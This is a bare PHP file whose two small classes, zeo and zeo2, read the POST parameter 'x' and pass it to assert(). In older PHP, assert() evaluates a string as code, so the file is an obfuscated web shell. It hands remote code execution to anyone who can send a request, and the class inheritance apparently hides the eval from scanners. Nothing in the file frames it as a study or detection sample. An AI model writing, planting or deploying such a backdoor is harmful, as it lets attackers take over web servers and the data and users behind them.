<?php 
class zeo2
{
	public $b ='';
	function post(){
		return $_POST['x'];
	}
}
class zeo extends zeo2
{
	public $code=null;
	function __construct(){
		$code=parent::post();
		assert($code);
	}
}
$blll = new zeo;
$bzzz = new zeo2;
?>